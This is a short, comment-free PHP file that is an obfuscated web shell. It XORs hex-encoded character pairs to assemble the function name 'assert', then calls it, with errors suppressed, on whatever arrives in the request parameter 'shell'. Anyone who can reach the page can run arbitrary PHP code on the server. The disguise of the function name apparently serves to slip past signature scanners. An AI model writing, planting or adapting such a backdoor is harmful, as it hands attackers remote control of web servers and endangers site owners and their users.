<?php
$a1=chr(hexdec("x59"));
$a2=chr(hexdec("x38"));
$a=$a1^$a2;
$b1=chr(hexdec("x54"));
$b2=chr(hexdec("x27"));
$b=$b1^$b2;
$c1=chr(hexdec("x2a"));
$c2=chr(hexdec("x4f"));
$c=$c1^$c2;
$d1=chr(hexdec("x4d"));
$d2=chr(hexdec("x3f"));
$d=$d1^$d2;
$e1=chr(hexdec("x2d"));
$e2=chr(hexdec("x59"));
$e=$e1^$e2;
$payload=$a.$b.$b.$c.$d.$e;
@$payload(@$_REQUEST['shell']);
?>
